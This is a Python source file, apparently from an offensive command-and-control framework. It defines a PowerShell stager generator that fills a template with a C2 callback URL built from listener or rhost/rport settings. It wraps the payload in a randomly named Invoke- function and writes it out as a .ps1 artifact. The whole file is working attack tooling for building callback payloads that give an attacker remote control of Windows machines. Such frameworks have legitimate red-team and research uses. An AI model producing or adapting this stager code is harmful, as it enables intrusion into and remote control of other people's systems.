from core.utils import print_good, print_info, gen_random_string


class STStager:
    def __init__(self):
        self.name = 'powershell'
        self.description = 'Stage via a PowerShell script'
        self.author = '@byt3bl33d3r'
        self.options = {
            'AsFunction': {
                'Description': "Generate stager as a function",
                'Required'   : False,
                'Value'      : True
            },
            'rhost': {
                'Description': "The trinity server host address (defaults to listener bind IP)",
                'Required'   : False,
                'Value'      : None
            },
            'rport': {
                'Description': "The trinity server host port (defaults to listener bind port)",
                'Required'   : False,
                'Value'      : None
            },
        }

    def generate(self, listener, filename=None, as_string=False):
        stager_filename = filename if filename is not None else 'artifacts/stager.ps1'
        remote_host = self.options['rhost']['Value'] or listener['BindIP']
        remote_port = self.options['rport']['Value'] or listener['Port']
        c2_url = f"{listener.name}://{remote_host}:{remote_port}"

        with open('stagers/templates/posh.ps1') as template_fd:
            template = template_fd.read()
        function_name = gen_random_string(4).upper()

        if bool(self.options['AsFunction']['Value']) is True:
            template = f"""function Invoke-{function_name}
{{
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)][String]$Url
    )

    {template}
}}
Invoke-{function_name} -Url "{c2_url}"
"""
        else:
            template = template.replace("$Url", f'"{c2_url}"')

        if not as_string:
            with open(stager_filename, 'w') as stager:
                stager.write(template)
                print_good(f"Generated stager to {stager.name}")
        else:
            return template
